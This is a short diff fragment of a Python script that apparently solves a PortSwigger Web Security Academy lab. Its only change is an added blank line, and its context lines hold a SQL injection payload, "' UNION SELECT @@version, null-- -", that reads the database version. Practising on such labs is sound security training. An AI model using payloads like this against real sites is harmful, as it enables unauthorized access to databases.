@@ -22,6 +22,7 @@ from colorama import Fore
 # Main
 #########
 url = "https://0ae20072037dfc2a83f19dc1005a0085.web-security-academy.net" # change this to your lab URL
+
 try:
     # payload to return the database version
     payload = "' UNION SELECT @@version, null-- -"
